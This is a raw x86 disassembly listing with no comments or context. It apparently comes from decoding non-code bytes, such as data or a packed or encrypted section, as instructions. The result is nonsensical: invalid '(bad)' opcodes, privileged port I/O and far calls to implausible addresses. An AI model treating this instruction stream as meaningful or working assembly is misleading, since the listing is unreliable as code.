  4a03ad:	push   ebx
  4a03ae:	ins    BYTE PTR es:[edi],dx
  4a03af:	and    BYTE PTR cs:[esi+0x6f],cl
  4a03b3:	lahf   
  4a03b4:	xchg   ecx,eax
  4a03b5:	jbe    0x4a0390
  4a03b7:	mov    al,ds:0xd985b06
  4a03bc:	and    DWORD PTR [ecx+eax*1-0x6fd9837d],edx
  4a03c3:	add    BYTE PTR [ebp+0x1a],cl
  4a03c6:	add    BYTE PTR [ecx],dh
  4a03c8:	in     al,dx
  4a03c9:	fidivr DWORD PTR [esi+0x61347b1c]
  4a03cf:	ins    BYTE PTR es:[edi],dx
  4a03d0:	fwait
  4a03d1:	enter  0xf005,0xc1
  4a03d5:	push   eax
  4a03d6:	jnp    0x4a03a9
  4a03d8:	or     ah,bl
  4a03da:	and    BYTE PTR [ebx-0x1fb3ceaf],bl
  4a03e0:	mov    al,0xa4
  4a03e2:	add    al,0x94
  4a03e4:	mov    edi,0x58e3ff79
  4a03e9:	jns    0x4a0413
  4a03eb:	push   ebx
  4a03ec:	dec    eax
  4a03ed:	push   eax
  4a03ee:	sub    DWORD PTR [edx+0x68168004],esp
  4a03f4:	adc    BYTE PTR [edi-0x6bcd5bf9],cl
  4a03fa:	cmp    al,0x1d
  4a03fc:	dec    edi
  4a03fd:	add    dl,BYTE PTR [eax+ebx*2-0x77]
  4a0401:	push   es
  4a0402:	or     eax,0xd56aa62a
  4a0407:	or     BYTE PTR [edi-0x618d12ff],ch
  4a040d:	add    ah,BYTE PTR [esp+edi*4+0x40e4a1]
  4a0414:	mov    al,BYTE PTR [edx+0x1c]
  4a0417:	shl    BYTE PTR [edx],0x20
  4a041a:	xchg   ebp,eax
  4a041b:	dec    esi
  4a041c:	add    DWORD PTR [esi+edx*1],ecx
  4a041f:	dec    edi
  4a0420:	mov    cl,0xd0
  4a0422:	test   al,0x74
  4a0424:	jb     0x4a040e
  4a0426:	pushf  
  4a0427:	add    DWORD PTR [ebx],edx
  4a0429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a042a:	xchg   edx,eax
  4a042b:	sbb    DWORD PTR [ebp-0x30],0x7
  4a042f:	or     BYTE PTR [ebx+ebx*1],bh
  4a0432:	(bad)  
  4a0433:	cld    
  4a0434:	pushf  
  4a0435:	je     0x4a0433
  4a0437:	sbb    esi,DWORD PTR [esp+edx*1]
  4a043a:	add    BYTE PTR [ecx+0x20],bl
  4a043d:	outs   dx,DWORD PTR ds:[esi]
  4a043e:	data16 and BYTE PTR [ecx-0x27],ah
  4a0442:	loope  0x4a044e
  4a0444:	dec    ecx
  4a0445:	cmp    al,BYTE PTR [ebp+0x4eae10e0]
  4a044b:	mov    ds,WORD PTR [edx+0x331c9fd6]
  4a0451:	add    eax,0x3bc373bf
  4a0456:	jp     0x4a04bb
  4a0458:	outs   dx,DWORD PTR ds:[esi]
  4a0459:	ins    DWORD PTR es:[edi],dx
  4a045a:	add    DWORD PTR cs:[edx-0x66],0x18
  4a045f:	adc    eax,0x82a195c0
  4a0464:	retf   0xf712
  4a0467:	sbb    ebp,ebx
  4a0469:	inc    edi
  4a046a:	add    BYTE PTR [ecx],ch
  4a046c:	ret    0x2584
  4a046f:	xchg   BYTE PTR [edx-0x22],cl
  4a0472:	lahf   
  4a0473:	bound  edx,QWORD PTR [edx]
  4a0475:	mov    cl,0xb0
  4a0477:	add    al,0x30
  4a0479:	or     al,0xbf
  4a047b:	add    al,0x8e
  4a047d:	sbb    BYTE PTR [eax],cl
  4a047f:	add    edx,DWORD PTR [edx+0x19]
  4a0482:	push   edx
  4a0483:	add    edx,DWORD PTR [eax]
  4a0485:	das    
  4a0486:	adc    cl,BYTE PTR [ecx+eax*2]
  4a0489:	in     al,0xbe
  4a048b:	nop
  4a048c:	jns    0x4a04b6
  4a048e:	ins    DWORD PTR es:[edi],dx
  4a048f:	xor    edx,DWORD PTR [edi+0x2fd78695]
  4a0495:	push   0xe8037434
  4a049a:	pop    ss
  4a049b:	pop    ss
  4a049c:	pop    eax
  4a049d:	push   edx
  4a049e:	sbb    DWORD PTR [edx-0x5b],ebp
  4a04a1:	push   esp
  4a04a2:	add    eax,0x3c3782a6
  4a04a7:	fadd   DWORD PTR [ecx+0x69]
  4a04aa:	jbe    0x4a0500
  4a04ac:	gs ins DWORD PTR es:[edi],dx
  4a04ae:	jo     0x4a048e
  4a04b0:	sub    BYTE PTR [edx],bh
  4a04b2:	shl    DWORD PTR [ebp-0x79],1
  4a04b5:	out    dx,al
  4a04b6:	addr16 cs inc ebx
  4a04b9:	test   eax,0x15907b05
  4a04be:	push   ss
  4a04bf:	popf   
  4a04c0:	sbb    BYTE PTR [eax+0x15750ca],dl
  4a04c6:	adc    eax,0xbbbfe674
  4a04cb:	mov    ebp,0x2e7250b1
  4a04d0:	sub    BYTE PTR [ebp+0x6d],ch
  4a04d3:	cs ja  0x4a0504
  4a04d6:	scas   eax,DWORD PTR es:[edi]
  4a04d7:	add    DWORD PTR [eax+ecx*2+0x14a0df9e],esi
  4a04de:	sbb    BYTE PTR ds:0x8515096f,dl
  4a04e4:	sub    al,BYTE PTR cs:[eax+0x66]
  4a04e8:	rcl    DWORD PTR [eax+ecx*1+0x18],1
  4a04ec:	mov    bh,0x5
  4a04ee:	popa   
  4a04ef:	fcomp  DWORD PTR [ecx+0x775d6d3f]
  4a04f5:	aad    0x3f
  4a04f7:	inc    eax
  4a04f8:	aaa    
  4a04f9:	mov    ch,0xf
  4a04fb:	inc    edi
  4a04fc:	pop    es
  4a04fd:	dec    esi
  4a04fe:	add    DWORD PTR ds:0x3fc51eed,esi
  4a0504:	mov    al,0xbb
  4a0506:	and    al,0x53
  4a0508:	xchg   DWORD PTR ds:0x4f7fd2f9,esp
  4a050e:	in     eax,dx
  4a050f:	das    
  4a0510:	aam    0x69
  4a0512:	out    dx,eax
  4a0513:	push   esi
  4a0514:	test   BYTE PTR ss:[edi+0xf],al
  4a0518:	cwde   
  4a0519:	les    ecx,FWORD PTR [ecx+0x17]
  4a051c:	je     0x4a04b8
  4a051e:	daa    
  4a051f:	int    0xfc
  4a0521:	imul   ebx,DWORD PTR [eax+ebx*1-0x10d85f96],0x16e91cf6
  4a052c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a052d:	das    
  4a052e:	aam    0x5e
  4a0530:	test   al,0x48
  4a0532:	jg     0x4a0583
  4a0534:	jnp    0x4a04f1
  4a0536:	jo     0x4a05b6
  4a0538:	inc    edi
  4a0539:	or     BYTE PTR [esi+edx*1-0x50],dh
  4a053d:	jmp    0xecd55a42
  4a0542:	push   esi
  4a0543:	repz or dl,BYTE PTR [eax]
  4a0546:	ret    0xf0be
  4a0549:	xor    BYTE PTR [edx+0x0],ch
  4a054c:	push   DWORD PTR ds:0xb7f77bc8
  4a0552:	inc    BYTE PTR [eax]
  4a0554:	add    ebx,DWORD PTR [esi-0x29743775]
  4a055a:	adc    DWORD PTR [eax+0x345574be],ebx
  4a0560:	add    DWORD PTR [ecx-0x7f8d5be],ebx
  4a0566:	add    al,BYTE PTR [ebx]
  4a0568:	nop
  4a0569:	sub    DWORD PTR [edx+ecx*1+0x4],esp
  4a056d:	add    eax,0xa6403cf2
  4a0572:	push   es
  4a0573:	jl     0x4a05cb
  4a0575:	pop    es
  4a0576:	push   cs
  4a0577:	nop
  4a0578:	out    0x1,eax
  4a057a:	add    BYTE PTR [edi+0x8],dl
  4a057d:	test   ah,ah
  4a057f:	jns    0x4a0501
  4a0581:	push   esp
  4a0582:	or     DWORD PTR [eax],ecx
  4a0584:	pop    eax
  4a0585:	or     al,BYTE PTR [edi]
  4a0587:	add    al,0x95
  4a0589:	add    ecx,DWORD PTR [ebx+ecx*1-0x64feef87]
  4a0590:	inc    edx
  4a0591:	sahf   
  4a0592:	pop    ecx
  4a0593:	or     al,0xd
  4a0595:	imul   edi,DWORD PTR [ecx+0x1e],0xffffffb0
  4a0599:	retf   0xe94
  4a059c:	xor    eax,0x70f5a18
  4a05a1:	dec    eax
  4a05a2:	in     eax,0x0
  4a05a4:	pushf  
  4a05a5:	adc    BYTE PTR [eax],ah
  4a05a7:	push   eax
  4a05a8:	cmp    DWORD PTR [eax-0x62],eax
  4a05ab:	pop    ebx
  4a05ac:	adc    DWORD PTR [edx+edx*1+0x4079e429],esp
  4a05b3:	jns    0x4a05dd
  4a05b5:	pop    esp
  4a05b6:	adc    esi,DWORD PTR [edx]
  4a05b8:	test   DWORD PTR [ecx+esi*4+0x14],ecx
  4a05bc:	xor    eax,0x53211615
  4a05c1:	enter  0x1714,0x18
  4a05c5:	adc    al,0x32
  4a05c7:	test   DWORD PTR [ecx+ebx*1+0x1a],ecx
  4a05cb:	dec    esp
  4a05cc:	and    DWORD PTR [ebx-0x38],edx
  4a05cf:	sbb    ebx,DWORD PTR [ebx*1-0x7acdeb38]
  4a05d6:	push   ds
  4a05d7:	pop    ds
  4a05d8:	jns    0x4a05f8
  4a05da:	and    BYTE PTR [ebx+0x20],dl
  4a05dd:	lods   al,BYTE PTR ds:[esi]
  4a05de:	pop    esp
  4a05df:	and    DWORD PTR [edi],eax
  4a05e1:	enter  0xf3,0x30
  4a05e5:	pop    ebp
  4a05e6:	and    dh,BYTE PTR [edx+esi*8+0x232a403c]
  4a05ed:	cmp    BYTE PTR [esi+0x24],bl
  4a05f0:	seto   dl
  4a05f3:	add    DWORD PTR [ebp+eiz*1+0x72a45f40],edi
  4a05fa:	cmp    BYTE PTR [esi+eiz*1],0xc4
  4a05fe:	daa    
  4a05ff:	sbb    al,0x20
  4a0601:	iret   
  4a0602:	add    ecx,DWORD PTR [eax+0x60]
  4a0605:	sub    ah,cl
  4a0607:	enter  0xf3,0xa9
  4a060b:	sub    DWORD PTR [eax+0x61],edx
  4a060e:	sub    bh,BYTE PTR [eax+eax*2]
  4a0611:	sub    al,BYTE PTR [edi]
  4a0613:	aam    0x2b
  4a0615:	pop    eax
  4a0616:	bound  edx,QWORD PTR [eax+0x2cf201ca]
  4a061c:	fsubr  QWORD PTR ds:0xf3c8072
  4a0622:	pusha  
  4a0623:	arpl   WORD PTR [esi],bp
  4a0625:	in     al,0x20
  4a0627:	iret   
  4a0628:	add    esp,DWORD PTR [edi+ebp*1-0xccf9b98]
  4a062f:	add    BYTE PTR [ecx+0x7031ec1c],ch
  4a0635:	gs inc eax
  4a0637:	sub    al,BYTE PTR [edi]
  4a0639:	enter  0xf432,0x33
  4a063d:	retf   0xf201
  4a0640:	cmp    al,0x78
  4a0642:	data16 xor al,0xfc
  4a0645:	cmp    BYTE PTR [edi+ecx*1],0x90
  4a0649:	xor    eax,0x95366780
  4a064e:	add    esp,esp
  4a0650:	jns    0x4a0656
  4a0652:	push   0x388837
  4a0657:	jns    0x4a0677
  4a0659:	and    BYTE PTR [ecx+ebp*2],cl
  4a065c:	cmp    DWORD PTR [esi-0x6f1ab7f9],ebx
  4a0662:	cmp    dl,BYTE PTR [edx+ebp*2]
  4a0665:	cmp    eax,DWORD PTR [ecx]
  4a0667:	push   edx
  4a0668:	cmp    DWORD PTR [eax-0x68],eax
  4a066b:	cmp    al,0x54
  4a066d:	push   cs
  4a066e:	nop
  4a066f:	out    0x1c,eax
  4a0671:	imul   edi,DWORD PTR ds:0xe4033ea0,0x79
  4a0678:	and    BYTE PTR [esp+ebp*2],0x3f
  4a067c:	jns    0x4a069c
  4a067e:	and    BYTE PTR [ebp+0x6d2c40a8],dl
  4a0684:	inc    ecx
  4a0685:	pop    es
  4a0686:	dec    eax
  4a0687:	in     eax,0x0
  4a0689:	mov    al,0x42
  4a068b:	xor    al,0x52
  4a068d:	cmp    DWORD PTR [eax-0x62],eax
  4a0690:	outs   dx,BYTE PTR ds:[esi]
  4a0691:	inc    ebx
  4a0692:	mov    eax,0xe7900e44
  4a0697:	add    DWORD PTR [edi+ebp*2],edi
  4a069a:	inc    ebp
  4a069b:	shl    ah,0x79
  4a069e:	adc    BYTE PTR [esi+eax*2+0x44],0x70
  4a06a3:	inc    edi
  4a06a4:	push   ds
  4a06a5:	and    BYTE PTR [ebp+0x4c48c803],dl
  4a06ab:	jno    0x4a06f5
  4a06ad:	in     eax,0x0
  4a06af:	jns    0x4a06fa
  4a06b1:	ror    BYTE PTR [edx+0x39],1
  4a06b4:	inc    eax
  4a06b5:	sahf   
  4a06b6:	pop    es
  4a06b7:	push   esp
  4a06b8:	jb     0x4a0705
  4a06ba:	fcom   DWORD PTR [eax+0x4c5201e7]
  4a06c0:	pop    esp
  4a06c1:	jae    0x4a0710
  4a06c3:	jns    0x4a0645
  4a06c5:	push   esp
  4a06c6:	push   cs
  4a06c7:	loopne 0x4a0717
  4a06c9:	fs je  0x4a06ec
  4a06cc:	xchg   ebp,eax
  4a06cd:	add    esp,esp
  4a06cf:	dec    edi
  4a06d0:	call   0x794aec25
  4a06d5:	push   ds
  4a06d6:	ins    BYTE PTR es:[edi],dx
  4a06d7:	jne    0x4a072a
  4a06d9:	lock inc eax
  4a06db:	sahf   
  4a06dc:	pop    es
  4a06dd:	dec    eax
  4a06de:	push   edx
  4a06df:	je     0x4a0757
  4a06e1:	push   ebx
  4a06e2:	out    0x1,eax
  4a06e4:	push   edx
  4a06e5:	cmp    eax,edi
  4a06e7:	push   esp
  4a06e8:	jl     0x4a0761
  4a06ea:	cmp    BYTE PTR [edi+ecx*1],0x90
  4a06ee:	push   ebp
  4a06ef:	add    BYTE PTR [eax+0x56],bh
  4a06f2:	iret   
  4a06f3:	add    esp,DWORD PTR [edx+esi*2+0x79085784]
  4a06fa:	pop    eax
  4a06fb:	add    BYTE PTR [ecx+0x598c201c],ch
  4a0701:	sub    al,BYTE PTR [edi]
  4a0703:	enter  0x10f3,0x7a
  4a0707:	pop    edx
  4a0708:	xchg   esp,eax
  4a0709:	pop    ebx
  4a070a:	add    edx,esi
  4a070c:	cmp    al,0x40
  4a070e:	sbb    BYTE PTR [ebx+0x5c],bh
  4a0711:	cmp    al,0xf
  4a0713:	nop
  4a0714:	retf   0x5d9c
  4a0717:	and    BYTE PTR [esi+ebx*2+0x3],bh
  4a071b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a071c:	jb     0x4a069e
  4a071e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a071f:	pop    edi
  4a0720:	test   eax,0x28cf201c
  4a0725:	jge    0x4a0787
  4a0727:	lods   al,BYTE PTR ds:[esi]
  4a0728:	popa   
  4a0729:	pop    es
  4a072a:	enter  0xf3,0x30
  4a072e:	jle    0x4a0792
  4a0730:	mov    ah,0xf2
  4a0732:	cmp    al,0x40
  4a0734:	sub    ah,BYTE PTR [ebx+0x38]
  4a0737:	jg     0x4a079d
  4a0739:	seto   dl
  4a073c:	add    DWORD PTR [ebp+eiz*2+0x72a48040],edi
  4a0743:	cmp    BYTE PTR [esi+eiz*2],0xc4
  4a0747:	addr16 sbb al,0x20
  4a074a:	iret   
  4a074b:	add    ecx,DWORD PTR [eax-0x7f]
  4a074e:	push   0xf3c8cc
  4a0753:	test   eax,0x6a825069
  4a0758:	cmp    al,0x40
  4a075a:	sub    al,BYTE PTR [edi]
  4a075c:	aam    0x6b
  4a075e:	pop    eax
  4a075f:	adc    DWORD PTR [eax+0x6cf201ca],0xffffffdc
  4a0766:	ins    DWORD PTR es:[edi],dx
  4a0767:	jb     0x4a06e9
  4a0769:	cmp    al,0xf
  4a076b:	pusha  
  4a076c:	test   BYTE PTR [esi-0x1c],ch
  4a076f:	and    bh,cl
  4a0771:	add    esp,DWORD PTR [edi+ebp*2-0xc8f7a98]
  4a0778:	add    BYTE PTR [ecx+0x7071ec1c],ch
  4a077e:	xchg   BYTE PTR [eax+0x2a],al
  4a0781:	pop    es
  4a0782:	enter  0xf472,0x73
  4a0786:	retf   0xf201
  4a0789:	cmp    al,0x78
  4a078b:	xchg   DWORD PTR [esp+edi*8-0x80],esi
  4a078f:	cmp    al,0xf
  4a0791:	nop
  4a0792:	jne    0x4a0714
  4a0794:	mov    BYTE PTR [esi-0x6b],dh
  4a0797:	add    esp,esp
  4a0799:	jns    0x4a079f
  4a079b:	mov    DWORD PTR [edi-0x78],esi
  4a079e:	js     0x4a07a0
  4a07a0:	jns    0x4a07c0
  4a07a2:	and    BYTE PTR [edx+ecx*4],cl
  4a07a5:	jns    0x4a0745
  4a07a7:	pop    es
  4a07a8:	dec    eax
  4a07a9:	in     eax,0x90
  4a07ab:	jp     0x4a07c1
  4a07ad:	mov    edi,DWORD PTR [ebx+0x1]
  4a07b0:	push   edx
  4a07b1:	cmp    DWORD PTR [eax-0x68],eax
  4a07b4:	jl     0x4a080a
  4a07b6:	push   cs
  4a07b7:	nop
  4a07b8:	out    0x1c,eax
  4a07ba:	mov    WORD PTR [ebp-0x60],?
  4a07bd:	jle    0x4a07c2
  4a07bf:	in     al,0x79
  4a07c1:	and    BYTE PTR [ecx*4+0x4b6037f],0x9e
  4a07c9:	test   al,0x68
  4a07cb:	mov    esp,0x210ca93b
  4a07d0:	iret   
  4a07d1:	sub    al,0x8e
  4a07d3:	xor    DWORD PTR [eax+0x73c84382],0x838f3408
  4a07dd:	mov    eax,0x2a421cf2
  4a07e2:	test   BYTE PTR [eax+edx*4],bh
  4a07e5:	test   DWORD PTR [edi-0x3fef3570],eax
  4a07eb:	xchg   BYTE PTR [ecx+edx*4-0x5c],al
  4a07ef:	xor    al,BYTE PTR [esp+edi*1+0xc88c887]
  4a07f6:	and    edi,ecx
  4a07f8:	and    DWORD PTR [edx+edx*4-0x77],ecx
  4a07fc:	ror    al,1
  4a07fe:	jae    0x4a0808
  4a0800:	test   eax,0x8b93548a
  4a0805:	sbb    al,0x42
  4a0807:	sub    al,BYTE PTR [ebx-0x28]
  4a080a:	mov    WORD PTR [esp+edx*4-0x70],ds
  4a080e:	retf   0xf210
  4a0811:	(bad)  
  4a0812:	loopne 0x4a07a2
  4a0814:	xor    al,BYTE PTR [esp+edi*1-0x706a9b79]
  4a081b:	call   0xa46bd741
  4a0820:	nop
  4a0821:	ins    BYTE PTR es:[edi],dx
  4a0822:	xchg   esi,eax
  4a0823:	xchg   ecx,eax
  4a0824:	jae    0x4a082e
  4a0826:	test   eax,0x7492f00c
  4a082b:	xchg   edi,eax
  4a082c:	inc    edx
  4a082d:	sub    al,BYTE PTR [ebx-0x38]
  4a0830:	xchg   ebx,eax
  4a0831:	clc    
  4a0832:	xchg   esp,eax
  4a0833:	out    0x10,eax
  4a0835:	repnz sbb al,0x7c
  4a0838:	cwde   
  4a0839:	xchg   ebp,eax
  4a083a:	add    BYTE PTR [ecx-0x6f79ab7c],bl
  4a0840:	xchg   esi,eax
  4a0841:	test   BYTE PTR [edi+0x39e42195],dl
  4a0847:	or     BYTE PTR [edx+0x8998c98],bl
  4a084d:	jns    0x4a085d
  4a084f:	and    DWORD PTR [eax],edx
  4a0851:	fwait
  4a0852:	call   0x9b94:0x6548439e
  4a0859:	sbb    BYTE PTR [esp+ebx*4+0x42195210],bl
  4a0860:	pushf  
  4a0861:	popf   
  4a0862:	push   esp
  4a0863:	xchg   BYTE PTR [eax-0x6162df19],dl
  4a0869:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a086a:	lahf   
  4a086b:	and    esp,esp
  4a086d:	cmp    DWORD PTR [eax+ebp*1+0xe79a09e],eax
  4a0874:	and    DWORD PTR [ebp-0x60cf5e54],edx
  4a087a:	mov    ds:0x8654843,al
  4a087f:	mov    ah,0xa3
  4a0881:	cmp    BYTE PTR [edx+0x19],dl
  4a0884:	inc    edx
  4a0885:	sahf   
  4a0886:	mov    al,ds:0x86a5bca4
  4a088b:	nop
  4a088c:	out    0x10,eax
  4a088e:	inc    eax
  4a088f:	mov    eax,ds:0x39e4c4a6
  4a0894:	test   BYTE PTR [edi+eiz*4+0x48],dl
  4a0898:	mov    ds:0x95210ea8,al
  4a089d:	and    esp,ecx
  4a089f:	test   eax,0x6548a350
  4a08a4:	or     BYTE PTR [ecx-0x56],bh
  4a08a7:	aam    0xab
  4a08a9:	sbb    DWORD PTR [edx-0x62],eax
  4a08ac:	inc    ebx
  4a08ad:	pop    eax
  4a08ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a08af:	lods   al,BYTE PTR ds:[esi]
  4a08b0:	fcom   QWORD PTR [eax-0x52adef19]
  4a08b6:	pusha  
  4a08b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a08b8:	scas   al,BYTE PTR es:[edi]
  4a08b9:	cmp    DWORD PTR [esp+edx*2+0x68afe486],eax
  4a08c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a08c1:	and    DWORD PTR [ebp-0x134f1bdf],edx
  4a08c7:	mov    cl,0x65
  4a08c9:	or     BYTE PTR [ecx+0xe],bh
  4a08cc:	jo     0x4a0875
  4a08ce:	mov    dl,0xf4
  4a08d0:	inc    edx
  4a08d1:	sahf   
  4a08d2:	inc    ebx
  4a08d3:	dec    eax
  4a08d4:	mov    bl,0x78
  4a08d6:	test   al,0xb4
  4a08d8:	out    0x10,eax
  4a08da:	push   edx
  4a08db:	sbb    esp,edi
  4a08dd:	mov    ch,0x80
  4a08df:	test   eax,0x90873c84
  4a08e4:	mov    dh,0x4
  4a08e6:	stos   BYTE PTR es:[edi],al
  4a08e7:	mov    bh,0xcf
  4a08e9:	and    DWORD PTR [edx+esi*1-0x54f34778],esp
  4a08f0:	mov    ecx,0x210ca908
  4a08f5:	nop
  4a08f6:	mov    edx,0x73c8432a
  4a08fb:	adc    al,0xac
  4a08fd:	mov    ebx,0xf210bc98
  4a0902:	sbb    al,0x42
  4a0904:	sbb    al,0xad
  4a0906:	mov    ebp,0xca90873c
  4a090b:	mov    al,ds:0xbfae24be
  4a0910:	and    DWORD PTR [edx+esi*1-0x563f577c],esp
  4a0917:	or     al,0x21
  4a0919:	iret   
  4a091a:	sub    al,0xaf
  4a091c:	shl    DWORD PTR [eax+0x73c843c2],0x8
  4a0923:	xor    al,0xb0
  4a0925:	ret    
  4a0926:	mov    eax,0x2a421cf2
  4a092b:	les    edi,FWORD PTR [ecx+esi*4]
  4a092e:	lds    eax,FWORD PTR [edi-0x3fef3570]
  4a0934:	mov    BYTE PTR [edx+esi*4-0x5c],0x32
  4a0939:	test   BYTE PTR [edi+eax*8],bh
  4a093c:	enter  0xcc8,0x21
  4a0940:	iret   
  4a0941:	and    DWORD PTR [ebx+esi*4-0x37],ecx
  4a0945:	ror    al,1
  4a0947:	jae    0x4a0951
  4a0949:	test   eax,0xcbb454ca
  4a094e:	sbb    al,0x42
  4a0950:	sub    al,BYTE PTR [ebx-0x28]
  4a0953:	int3   
  4a0954:	pop    esp
  4a0955:	mov    ch,0x90
  4a0957:	retf   0xf210
  4a095a:	int    0xe0
  4a095c:	into   
  4a095d:	xor    al,BYTE PTR [esp+edi*1-0x30499b79]
  4a0964:	call   0xa46bd88a
  4a0969:	shr    BYTE PTR [edi+esi*4-0x2f],1
  4a096d:	jae    0x4a0977
  4a096f:	test   eax,0x74d2f00c
  4a0974:	mov    eax,0xc8432a42
  4a0979:	sar    eax,cl
  4a097b:	aam    0xe7
  4a097d:	adc    dl,dh
  4a097f:	sbb    al,0x7c
  4a0981:	mov    ecx,0x84ba00d5
  4a0986:	push   esp
  4a0987:	xchg   BYTE PTR [eax-0x6a287b2a],dl
  4a098d:	and    esp,esp
  4a098f:	cmp    DWORD PTR [eax],ecx
  4a0991:	mov    ebx,0x8d98cd8
  4a0996:	jns    0x4a09a6
  4a0998:	and    DWORD PTR [eax],edx
  4a099a:	mov    esp,0x48439eda
  4a099f:	gs xchg esp,eax
  4a09a1:	fistp  DWORD PTR [eax]
  4a09a3:	mov    ebp,0x195210dc
  4a09a8:	inc    edx
  4a09a9:	pushf  
  4a09aa:	fst    QWORD PTR [esi+eax*4-0x70]
  4a09ae:	out    0x20,eax
  4a09b0:	mov    esi,0x21dfa4de
  4a09b5:	in     al,0x39
  4a09b7:	test   BYTE PTR [eax],ch
  4a09b9:	mov    edi,0x210e79e0
  4a09be:	xchg   ebp,eax
  4a09bf:	lods   al,BYTE PTR ds:[esi]
  4a09c0:	loope  0x4a09f2
  4a09c2:	shl    dl,0x43
  4a09c5:	dec    eax
  4a09c6:	or     BYTE PTR gs:[ebx+eiz*8+0x42195238],dh
  4a09ce:	sahf   
  4a09cf:	shl    esp,0xbc
  4a09d2:	in     eax,0x86
  4a09d4:	nop
  4a09d5:	out    0x10,eax
  4a09d7:	inc    eax
  4a09d8:	ret    0xc4e6
  4a09db:	in     al,0x39
  4a09dd:	test   BYTE PTR [edi+eiz*8+0x48],dl
  4a09e1:	ret    
  4a09e2:	call   0x21df2af5
  4a09e7:	int3   
  4a09e8:	jmp    0x6592ce3d
  4a09ed:	or     BYTE PTR [ecx-0x16],bh
  4a09f0:	aam    0xeb
  4a09f2:	sbb    DWORD PTR [edx-0x62],eax
  4a09f5:	inc    ebx
  4a09f6:	pop    eax
  4a09f7:	(bad)
  4a09fa:	nop
  4a09fb:	out    0x10,eax
  4a09fd:	push   edx
  4a09fe:	in     eax,dx
  4a09ff:	pusha  
  4a0a00:	(bad)  
  4a0a01:	out    dx,al
  4a0a02:	cmp    DWORD PTR [esp+edx*2+0x68efe486],eax
  4a0a09:	(bad)  
  4a0a0a:	and    DWORD PTR [ebp-0x130f1bdf],edx
  4a0a10:	icebp  
  4a0a11:	or     BYTE PTR gs:[ecx+0xe],bh
  4a0a15:	jo     0x4a09df
  4a0a17:	repnz hlt 
  4a0a19:	inc    edx
  4a0a1a:	sahf   
  4a0a1b:	inc    ebx
  4a0a1c:	dec    eax
  4a0a1d:	repz js 0x4a09e9
  4a0a20:	hlt    
  4a0a21:	out    0x10,eax
  4a0a23:	push   edx
  4a0a24:	sbb    esp,edi
  4a0a26:	cmc    
  4a0a27:	or     dl,0x84
  4a0a2a:	cmp    al,0x87
  4a0a2c:	nop
  4a0a2d:	test   BYTE PTR [ebx+ecx*8],0xf7
  4a0a31:	iret   
  4a0a32:	and    DWORD PTR [edx+esi*1-0x33f30778],esp
  4a0a39:	stc    
  4a0a3a:	or     BYTE PTR [ecx-0x56fdef4],ch
  4a0a40:	sub    al,BYTE PTR [ebx-0x38]
  4a0a43:	jae    0x4a0a59
  4a0a45:	int    0xfb
  4a0a47:	cwde   
  4a0a48:	cld    
  4a0a49:	adc    dl,dh
  4a0a4b:	sbb    al,0x42
  4a0a4d:	sbb    al,0xce
  4a0a4f:	std    
  4a0a50:	cmp    al,0x87
  4a0a52:	nop
  4a0a53:	retf   0xfea0
  4a0a56:	and    al,0xcf
  4a0a58:	inc    DWORD PTR ds:0xa88432b2
  4a0a5e:	add    BYTE PTR [ecx],al
  4a0a60:	push   esp
  4a0a61:	xchg   BYTE PTR [eax+0x1d02ce7],dl
  4a0a67:	mov    al,0x2
  4a0a69:	and    esp,esp
  4a0a6b:	cmp    DWORD PTR [esp+esi*1+0xe7903d1],eax
  4a0a72:	and    DWORD PTR [ebp-0x2dc3fb48],edx
  4a0a78:	add    eax,0x8654843
  4a0a7d:	rol    BYTE PTR [esi],0x44
  4a0a80:	push   edx
  4a0a81:	sbb    DWORD PTR [edx-0x62],eax
  4a0a84:	rol    DWORD PTR [edi],cl
  4a0a86:	enter  0x8608,0x90
  4a0a8a:	out    0x10,eax
  4a0a8c:	dec    esp
  4a0a8d:	aam    0x9
  4a0a8f:	shl    ah,1
  4a0a91:	cmp    DWORD PTR [esp+edx*2+0xbd5540a],eax
  4a0a98:	push   cs
  4a0a99:	and    DWORD PTR [ebp+0x5c0cd821],edx
  4a0a9f:	(bad)  
  4a0aa0:	dec    eax
  4a0aa1:	or     BYTE PTR gs:[ecx+0xd],bh
  4a0aa5:	loopne 0x4a0ab5
  4a0aa7:	sbb    DWORD PTR [edx-0x62],eax
  4a0aaa:	inc    ebx
  4a0aab:	xlat   BYTE PTR fs:[ebx]
  4a0aad:	psubsb mm2,QWORD PTR [eax+0x105210e7]
  4a0ab4:	ins    BYTE PTR es:[edi],dx
  4a0ab5:	fcom   DWORD PTR [ecx]
  4a0ab7:	cmp    DWORD PTR [esp+edx*2+0x7412f086],eax
  4a0abe:	fldenv [ecx]
  4a0ac0:	xchg   ebp,eax
  4a0ac1:	and    esp,esp
  4a0ac3:	adc    edi,eax
  4a0ac5:	adc    al,0x73
  4a0ac7:	or     BYTE PTR [ecx+0xe],bh
  4a0aca:	jl     0x4a0aa6
  4a0acc:	adc    eax,0x2a42db00
  4a0ad1:	inc    ebx
  4a0ad2:	enter  0x8416,0x17
  4a0ad6:	retf   0xf210
  4a0ad9:	sbb    al,0x8
  4a0adb:	fcomp  QWORD PTR [eax]
  4a0add:	mov    WORD PTR [esp+edi*1+0x10199087],es
  4a0ae4:	fstp   QWORD PTR [edx]
  4a0ae6:	iret   
  4a0ae7:	and    DWORD PTR [edx+esi*1-0x21e7e46c],esp
  4a0aee:	sbb    al,0x8
  4a0af0:	test   eax,0x1d9c210c
  4a0af5:	sub    al,BYTE PTR [ebx-0x38]
  4a0af8:	jae    0x4a0b1a
  4a0afa:	fistp  WORD PTR [esi]
  4a0afc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0afd:	pop    ds
  4a0afe:	adc    dl,dh
  4a0b00:	sbb    al,0x42
  4a0b02:	sub    al,ah
  4a0b04:	and    BYTE PTR [edi+eax*4],bh
  4a0b07:	nop
  4a0b08:	retf   0x21ac
  4a0b0b:	xor    cl,ah
  4a0b0d:	and    ah,BYTE PTR [ecx]
  4a0b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0b10:	xor    al,BYTE PTR [esp+esi*4+0x210ca923]
  4a0b17:	iret   
  4a0b18:	cmp    dl,ah
